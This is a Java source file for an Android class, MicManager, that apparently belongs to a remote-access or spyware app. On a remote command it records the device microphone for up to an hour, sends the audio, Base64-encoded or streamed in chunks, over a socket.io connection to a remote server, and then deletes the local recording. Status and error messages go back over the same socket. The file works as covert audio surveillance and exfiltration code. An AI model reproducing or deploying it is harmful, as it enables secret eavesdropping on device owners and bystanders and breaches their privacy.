package com.fason.app.features.mic;

import android.Manifest;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;

import org.json.JSONObject;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class MicManager {

    private static volatile MediaRecorder recorder;
    private static volatile File audioFile;
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean recording = new AtomicBoolean(false);
    private static Runnable stopTask;

    private MicManager() {}

    public static boolean isRecording() {
        return recording.get();
    }

    public static void start(int seconds) {
        if (seconds <= 0 || seconds > 3600) return;

        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendError("No mic permission");
            return;
        }

        stop();

        if (!recording.compareAndSet(false, true)) return;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }

        try {
            File cache = FasonApp.getContext().getCacheDir();
            if (cache == null) {
                recording.set(false);
                return;
            }

            audioFile = File.createTempFile("rec_", ".mp4", cache);

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            stopTask = () -> {
                stop();
                sendAudio();
            };
            handler.postDelayed(stopTask, seconds * 1000L);

            sendStatus("recording", seconds);

        } catch (Exception e) {
            recording.set(false);
            sendError("Recording failed: " + e.getMessage());
            releaseType();
            if (audioFile != null) { audioFile.delete(); audioFile = null; }
        }
    }

    public static void stop() {
        if (stopTask != null) {
            handler.removeCallbacks(stopTask);
            stopTask = null;
        }

        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
            }
        } catch (Exception ignored) {}

        recording.set(false);
        releaseType();
    }

    private static void releaseType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
    }

    private static void sendAudio() {
        final File fileToSend = audioFile;
        audioFile = null;

        exec.execute(() -> {
            try {
                if (fileToSend == null || !fileToSend.exists()) {
                    sendError("Audio file not found");
                    return;
                }

                if (TransferHelper.shouldChunk(fileToSend.length())) {
                    JSONObject meta = new JSONObject();
                    meta.put(Protocol.KEY_FILE, true);
                    meta.put(Protocol.KEY_NAME, fileToSend.getName());
                    meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                    io.socket.client.Socket s = SocketClient.getInstance().getSocket();
                    if (s != null) {
                        TransferHelper.streamFile(s, Protocol.MIC, fileToSend, meta);
                    }
                } else {
                    byte[] data = TransferHelper.readSmallFile(fileToSend);
                    if (data == null) { sendError("Read failed"); return; }

                    JSONObject obj = new JSONObject();
                    obj.put(Protocol.KEY_FILE, true);
                    obj.put(Protocol.KEY_NAME, fileToSend.getName());
                    obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                    obj.put(Protocol.KEY_SIZE, data.length);
                    obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                    io.socket.client.Socket s = SocketClient.getInstance().getSocket();
                    if (s != null) s.emit(Protocol.MIC, obj);
                }

            } catch (Exception e) {
                sendError("Send failed: " + e.getMessage());
            } finally {
                if (fileToSend != null) {
                    fileToSend.delete();
                }
            }
        });
    }

    private static void sendStatus(String status, int duration) {
        try {
            io.socket.client.Socket s = SocketClient.getInstance().getSocket();
            if (s == null) return;
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STATUS, status);
            obj.put(Protocol.KEY_DURATION, duration);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            s.emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }

    private static void sendError(String error) {
        try {
            io.socket.client.Socket s = SocketClient.getInstance().getSocket();
            if (s == null) return;
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            s.emit(Protocol.MIC, obj);
        } catch (Exception ignored) {}
    }
}
